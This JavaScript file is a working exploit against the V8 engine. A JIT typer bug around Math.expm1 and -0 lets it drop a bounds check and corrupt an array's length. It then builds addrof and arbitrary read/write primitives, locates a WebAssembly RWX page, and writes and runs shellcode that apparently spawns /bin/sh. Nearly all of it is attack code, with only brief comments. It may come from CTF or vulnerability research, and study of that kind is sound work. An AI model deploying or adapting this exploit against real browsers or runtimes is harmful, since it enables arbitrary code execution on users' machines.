// double/int conversion helpers
var helper_arrbuf = new ArrayBuffer(8);
var f64_arr = new Float64Array(helper_arrbuf);
var u64_arr = new BigUint64Array(helper_arrbuf);

function ftoi(x) {
	f64_arr[0] = x;
	return u64_arr[0];
}

function itof(x) {
	u64_arr[0] = BigInt(x);
	return f64_arr[0];
}

function f(x) {
	let oob_arr = [.1, .1, .1];	// the array whose CheckBounds should be eliminated
	let ret_oob_arr = [.2, .2, .2];	// the array whose length will be overwritten and returned as an OOB read/write primitive
	let z = {a: -0};	// we'll use z.a instead of -0 so that it is not optimized to a NumberConstant[-0] until escape analysis phase
	let w = Object.is(Math.expm1(x), z.a);	// the FeedbackType detected for this (in UpdateFeedbackType()) in the 3rd typer run in simplified-lowering is constant false
	// console.log(oob_arr[w * 3]);
	// This will overwrite a huge value into ret_oob_arr's length
	oob_arr[w * 11] = 1.2882297539194267e-231;	// because the type of w is constant false, checkbounds for this write will be eliminated.
	return ret_oob_arr;
}

f(0);
// %OptimizeFunctionOnNextCall(f);
for (let i = 0; i < 0x10000; i++) { f(0); }	// optimize f with assumption that its parameter is a number
f("0");	// break the assumption on f's parameter being a number
// %OptimizeFunctionOnNextCall(f);
for (let i = 0; i < 0x10000; i++) { f(0); }	// optimize f again. Now the number assumption is broken and Math.expm1 doesn't get optimized to a number-specific node
var ret_oob_arr = f(-0);	// get our OOB array
// %DebugPrint(f);
// %DebugPrint(ret_oob_arr);
// %SystemBreak();

var obj_arr = [{a: 1}];
// %DebugPrint(obj_arr);

// write an object into obj_arr and read its address through ret_oob_arr
function addrof(obj) {
	obj_arr[0] = obj;
	return ftoi(ret_oob_arr[11]);
}
// console.log(addrof(obj_arr).toString(16));

let rw_arr = new BigUint64Array(0x100);
// %DebugPrint(rw_arr);

// get arb read/write by overwriting the data ptr of a typed array
function set_rw_target(addr) {
	ret_oob_arr[40] = itof(addr);
}

// load some wasm code to map the rwx page
let wasm_code = new Uint8Array([
	0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x05, 0x01, 0x60,
	0x00, 0x01, 0x7f, 0x03, 0x02, 0x01, 0x00, 0x07, 0x08, 0x01, 0x04, 0x6d,
	0x61, 0x69, 0x6e, 0x00, 0x00, 0x0a, 0x06, 0x01, 0x04, 0x00, 0x41, 0x00,
	0x0b
]);
let wasm_module = new WebAssembly.Module(wasm_code);
let wasm_instance = new WebAssembly.Instance(wasm_module);
// %DebugPrint(wasm_instance);

// get the address of the rwx page
set_rw_target(addrof(wasm_instance) - 1n);
let rwx_page_addr = rw_arr[29];
console.log("rwx page @ " + rwx_page_addr.toString(16));

// write shellcode in the rwx page
set_rw_target(rwx_page_addr);
let shellcode = [0x732f6e69622fbf48n, 0xf631e78948570068n, 0xf0000003bb8d231n, 0x5n];
for (let i = 0; i < shellcode.length; i++) {
    rw_arr[i] = shellcode[i];
}

// %SystemBreak();
wasm_instance.exports.main();	// invoke the shellcode
